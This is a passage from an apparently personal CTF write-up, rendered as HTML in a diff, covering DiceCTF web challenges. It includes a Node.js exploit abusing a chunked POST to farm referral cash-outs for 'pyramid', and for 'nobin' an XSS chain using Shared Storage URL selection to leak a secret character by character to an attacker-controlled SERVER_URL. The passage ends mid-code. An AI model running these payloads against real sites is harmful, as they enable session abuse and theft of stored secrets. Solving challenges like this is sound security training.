+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;set-cookie&#34;</span>, <span style="color:#e6db74">`token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>So by sending a POST request to <code>/new</code> without a complete body, we can get the token, then make a reference code from that token, then finish the request&rsquo;s body with <code>refer</code> is our own token. I chose <code>Transfer-Encoding: chunked</code> as normal <code>Content-Type: application/x-form-urlencoded</code> needs <code>Content-Length</code> which is calculatable but I was too lazy to do so.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">new_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/new&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/code&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">home_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cashout_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/cashout&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buy_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/buy&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">new_socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">createConnection</span>(<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">host</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">new_socket</span>.<span style="color:#a6e22e">write</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">`POST </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">new_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1\r\n`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">`Host: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\r\n`</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">`Transfer-Encoding: chunked\r\n\r\n`</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">get_code</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">code_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> },
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;&lt;strong&gt;&#34;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;&lt;/strong&gt;&#34;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">trim</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">code</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">create_referer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">code</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">new_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`name=testtesttest&amp;refer=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">make_bail</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">cashout_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> },
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">get_home</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">home_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> },
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">text</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buy_flag</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">buy_path</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`token=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> },
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">text</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">res</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;token=&#34;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">trim</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;token: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">get_code</span>(<span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">send_data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`name=testtesttest&amp;refer=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">new_socket</span>.<span style="color:#a6e22e">end</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send_data</span>.<span style="color:#a6e22e">length</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">send_data</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\r\n0\r\n\r\n&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_referer</span>(<span style="color:#a6e22e">code</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">65</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">make_bail</span>(<span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">home</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">get_home</span>(<span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[HOME REQ]: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">home</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">buy_flag</span>(<span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[FLAG REQ]: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[New Socket]: Connection closed by server.&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;error&#34;</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;[New Socket]: TLS Socket Error:&#34;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ChatGPT help me proxy from http://localhost:3000 to https://pyramid.dicec.tf:443 by socat TCP-LISTEN:3000,reuseaddr,fork SSL:pyramid.dicec.tf:443,verify=0
+</span></span></span></code></pre></div><h2 id="nobin">nobin<a hidden class="anchor" aria-hidden="true" href="#nobin">#</a></h2>
+<p>This was an XSS challenge. The endpoint for XSS was given at <code>/xss</code> but the main thing here was that the secret for the flag was put in SharedStorage, which can only be access from restricted sources. Reading this <a href="https://developer.mozilla.org/en-US/docs/Web/API/Shared_Storage_API">docs</a>, I knew that: <code>you can only read shared storage data from inside a worklet</code> and <code>Output gates are URL Selection and Run</code>. I chose the URL Selection as the run was kinda hard to understand.</p>
+<p>About the URL Selection, after passed in urls, the selectURL would return the URL with index that return by the worklet. And base on my own testing, I could pass in around 7 urls.</p>
+<p>After a while of trials and errors, I came up with this kinda crazy ideas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">alphabet</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdef&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">count</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">ceil</span>(<span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">l</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">solve</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sharedStorage</span>.<span style="color:#a6e22e">worklet</span>.<span style="color:#a6e22e">addModule</span>(<span style="color:#e6db74">&#34;SERVER_URL/module.js&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">truncated_alphabet</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">l</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">k</span>, <span style="color:#a6e22e">l</span> <span style="color:#f92672">*</span> (<span style="color:#a6e22e">k</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">truncated_alphabet</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urls</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`SERVER_URL/secret?index=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">j</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">k</span><span style="color:#e6db74">}</span><span style="color:#e6db74">0`</span>,
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">truncated_alphabet</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">urls</span>.<span style="color:#a6e22e">push</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`SERVER_URL/secret?secret=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">truncated_alphabet</span>[<span style="color:#a6e22e">i</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;index=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">j</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// console.log(urls);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sharedStorage</span>
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">selectURL</span>(<span style="color:#e6db74">&#34;exploit&#34;</span>, <span style="color:#a6e22e">urls</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">resolveToConfig</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">index</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">j</span>, <span style="color:#a6e22e">alphabet</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">truncated_alphabet</span> },
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">keepAlive</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(
+</span></span><span style="display:flex;"><span>            (<span style="color:#a6e22e">config</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">config</span>) {
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#my-frame&#34;</span>).<span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">config</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">frame</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;fencedframe&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;my-frame&#34;</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">frame</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">solve</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">count</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`SERVER_URL/ok?index=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">j</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">res</span>) =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">text</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">text</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;OK&#34;</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`/xss?xss=&lt;script&gt;const%20k=0;const%20j=</span><span style="color:#e6db74">${</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/script&gt;&lt;script%20src=&#34;SERVER_URL/solve.js&#34;&gt;&lt;/script&gt;`</span>;
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`/xss?xss=&lt;script&gt;const%20k=</span><span style="color:#e6db74">${</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">k</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">}</span><span style="color:#e6db74">;const%20j=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">j</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/script&gt;&lt;script%20src=&#34;SERVER_URL/solve.js&#34;&gt;&lt;/script&gt;`</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>I had to set the <code>location.href</code> as <code>sharedStorage.selectURL</code> was kinda broken on second called.
+The idea was simple, I leaked each character of secret via the URL selection, and if the character was correct, it called back to my SERVER_URL with the character.
+I hosted the <code>module.js</code> as follow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">urls</span>, <span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sharedStorage</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;message&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">secret</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">charCode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">secret</span>[<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">index</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">charCode</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">alphabet</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">alphabet</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">charCode</span>);
